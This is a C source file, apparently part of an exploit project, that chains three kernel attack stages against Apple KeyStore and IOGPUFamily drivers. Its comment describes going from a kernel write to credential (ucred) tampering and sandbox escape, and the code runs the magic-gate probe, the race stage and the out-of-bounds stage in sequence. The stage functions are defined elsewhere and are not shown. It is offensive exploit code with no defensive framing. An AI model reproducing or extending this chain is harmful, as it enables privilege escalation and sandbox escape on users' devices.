/* chain.c — sandbox-escape first: (1) KeyStore UC magic-gate probe = the
   only live non-entitlement surface (s17/s35 -> 0xe00002f0 content gate);
   (2) race lanes (KeyStore/AGX concurrent dispatch); (3) IOGPUFamily OOB
   fast lane. Any stage that lands a win feeds the next: kwrite -> ucred
   -> sandbox escape (label nulled). Escaped state is preserved in the
   kernel once refs are in hand. */
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"

void nk_chain_run(void) {
    nk_filelog_open("chain");
    nk_log("[ch] stage 1: KS magic gate (escape candidate #1)");
    nk_ksmagic_run();
    nk_log("[ch] stage 1 done -> stage 2: race");
    fflush(stdout);
    nk_racer_run();
    nk_log("[ch] stage 2 done -> stage 3: IOGPU OOB");
    fflush(stdout);
    nk_iogpu_oob_run();
    nk_log("[ch] chain end (all three stages returned)");
    nk_filelog_close();
}
